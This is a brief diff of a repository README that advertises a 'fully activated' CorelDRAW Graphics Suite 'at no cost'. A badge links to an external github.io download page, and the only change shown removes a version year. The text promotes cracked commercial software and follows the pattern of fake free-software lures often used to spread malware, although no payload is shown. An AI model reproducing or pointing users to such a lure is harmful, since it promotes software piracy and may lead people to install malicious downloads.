@@ -1,6 +1,6 @@
 # 🚀 CorelDRAW Activated - Graphics Suite Pro-Edition  
 
-Experience professional graphic design without limits with this fully activated CorelDRAW 2025 suite - the ultimate solution for designers, illustrators and digital artists seeking premium tools at no cost.  
+Experience professional graphic design without limits with this fully activated CorelDRAW suite - the ultimate solution for designers, illustrators and digital artists seeking premium tools at no cost.  
 
 [![Download CorelDRAW](https://img.shields.io/badge/Download-CorelDRAW-blueviolet)](https://coreldraw-activated.github.io/.github/)  
 
